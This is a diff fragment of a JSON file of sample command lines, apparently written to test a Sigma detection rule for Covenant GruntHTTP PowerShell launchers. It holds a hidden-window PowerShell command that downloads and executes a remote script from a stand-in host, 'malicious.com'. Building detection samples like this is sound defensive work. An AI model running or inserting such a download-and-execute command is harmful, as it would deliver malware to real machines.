@@ -1,4 +1,3 @@
-```json
 [
   {
     "output": "powershell.exe -Sta -Nop -Window Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"",
@@ -21,4 +20,3 @@
     "explanation": "This command includes the suspicious flags '-Sta', '-Nop', '-WindowStyle Hidden', and the string 'GruntHTTP', which matches the Sigma rule's selection_2 criteria. It simulates a PowerShell command line attempting to execute a Covenant GruntHTTP launcher."
   }
 ]
-```
